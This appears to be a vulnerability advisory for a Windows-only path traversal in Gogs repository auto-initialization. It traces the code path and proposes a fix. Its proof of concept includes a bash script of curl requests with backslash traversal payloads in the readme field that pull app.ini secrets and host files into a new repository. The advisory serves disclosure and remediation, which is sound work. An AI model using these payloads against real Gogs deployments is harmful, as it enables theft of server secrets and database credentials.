# Gogs repository AutoInit template path traversal allows arbitrary file read on Windows ## Summary An authenticated user who is allowed to create repositories can trigger this issue on a Windows deployment through the web form (POST /repo/create) or the API (POST /api/v1/user/repos), using the ordinary AutoInit option. The template name supplied at creation time is used as a filesystem path without an allowlist check, so a file outside the intended custom/conf template directory, including custom/conf/app.ini, is read and committed into the user's own new repository where it can be read back in full. This was checked on the latest commit of the project. ## Technical Details The readme, license, and gitignores fields of the create-repository request are plain strings with no binding validation and no allowlist. Only the repository name is validated (internal/form/repo.go:23-33 and internal/route/api/v1/repo_repo.go:160-168). The ineffective check is in getRepoInitFile at internal/database/repo.go:986-995, which builds relPath = path.Join(tp, TrimLeft(path.Clean('/'+name), '/')) and then customPath = filepath.Join(CustomDir, 'conf', relPath). path.Clean treats a backslash as an ordinary character on every platform and does not fold parent-directory segments written with backslashes. On Windows, filepath.Join then folds those backslashes and resolves the path outside custom/conf, osx.IsFile matches, and os.ReadFile(customPath) returns the file bytes. Those request values flow unmodified from CreatePost (internal/route/repo/repo.go:119-128) and createUserRepo (internal/route/api/v1/repo_repo.go:170-179) into CreateRepository (internal/database/repo.go:1221, 1254-1255), then into initRepository (1059, 1082-1090) when AutoInit is true, and into prepareRepoCommit (997, 1005, 1027, 1045), which calls getRepoInitFile for the readme, each comma-separated gitignore entry, and the license. prepareRepoCommit writes the returned bytes to README.md, .gitignore, and LICENSE in the temporary work tree, and initRepoCommit (951-971) runs git add --all, commit, and push, so the content becomes the initial commit of the new repository and is retrievable through the raw API. Forward-slash ../ input is neutralized by path.Clean, and the embed.FS fallback is protected by fs.ValidPath, so the reachable sink is the os.ReadFile(customPath) branch. On Linux and macOS, filepath.Join treats the backslash as a filename character, so this path is Windows-only. ## Impact On a Windows deployment, an authenticated user with repository-creation rights can read custom/conf/app.ini, disclosing SECRET_KEY and the database credentials, and can read any file that the Gogs process can read. SECRET_KEY is the source of the AES-GCM key used for two-factor secrets (MD5(SecretKey), see two_factor.go and two_factors.go), so its disclosure can enable decryption or forgery of those secrets when combined with other data. The read content is placed in the initial commit of the user's own repository and can be read back in full. ## Proof of Concept <details> <summary>Show the proof of concept</summary> Verified on commit dbbd717e923694c36f41b0360515b4374bbe6ee0. From a normal checkout of that commit, build and start the service: ```bash git checkout dbbd717e923694c36f41b0360515b4374bbe6ee0 CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -tags prod -o gogs.exe ./cmd/gogs ./gogs.exe web ``` After registering the user and exchanging HTTP basic authentication for a personal access token, run reproduce.sh, whose source is inlined below: ```bash #!/usr/bin/env bash set -euo pipefail BASE=http://127.0.0.1:3000 AUTH='Authorization: token <sha>' echo 'Exploit-A' curl -sS -o /dev/null -w 'create=%{http_code}
' -X POST '$BASE/api/v1/user/repos' -H '$AUTH' -H 'Content-Type: application/json' -d '{'name':'pocrepo','auto_init':true,'readme':'..\app.ini'}' curl -sS -o readme_a.txt -w 'readme=%{http_code}
' -H '$AUTH' '$BASE/api/v1/repos/attacker/pocrepo/raw/master/README.md' echo 'Exploit-B' curl -sS -o /dev/null -w 'create=%{http_code}
' -X POST '$BASE/api/v1/user/repos' -H '$AUTH' -H 'Content-Type: application/json' -d '{'name':'pocrepo2','auto_init':true,'readme':'..\..\..\host_secret.txt'}' curl -sS -o readme_b.txt -w 'readme=%{http_code}
' -H '$AUTH' '$BASE/api/v1/repos/attacker/pocrepo2/raw/master/README.md' grep -q 'SECRET_KEY = POC-CANARY' readme_a.txt && A=1 || A=0 grep -q 'TOPSECRET_HOST_ONLY_ZZZq' readme_b.txt && B=1 || B=0 printf 'app.ini_SECRET_leak=%s host_secret_leak=%s
' '$A' '$B' [ '$A$B' = '11' ] && printf 'LEAK_CONFIRMED
REPRO_RESULT: reproduced
' ``` The same path construction built for each platform shows why the effect is Windows-only. pathcheck.go: ```go package main import ( 'fmt' 'path/filepath' ) func main() { fmt.Println(filepath.Join(`C:\gogs\custom`, 'conf', `readme/..\app.ini`)) } ``` Observed output: ```text Gogs 0.15.0+dev, Available on http://127.0.0.1:3000/ Windows build: C:\gogs\custom\conf\app.ini Linux build: C:\gogs\custom/conf/readme/..\app.ini create=201 readme=200 SECRET_KEY = POC-CANARY-SECRET-KEY-do-not-use-9f3a2b7c1d8e [database] TYPE = sqlite3 PATH = C:\gogs\data\gogs.db create=201 readme=200 [TOPSECRET_HOST_ONLY_ZZZq] app.ini_SECRET_leak=1 host_secret_leak=1 LEAK_CONFIRMED REPRO_RESULT: reproduced ``` git show master:README.md in the second repository returns the same [TOPSECRET_HOST_ONLY_ZZZq] value. The server log records POST /api/v1/user/repos 201 Created and two 200 OK responses for the raw README requests. reproduce.sh exits 0. </details> ## Suggested Fix Validate readme, license, and each gitignores template name against the fixed set of available templates before they reach getRepoInitFile, and replace the ineffective path.Clean in internal/database/repo.go:986-995 with the project's pathx.Clean (internal/pathx/pathx.go:13-16), or reject both path separators, so that filepath.Join cannot resolve outside custom/conf on Windows.

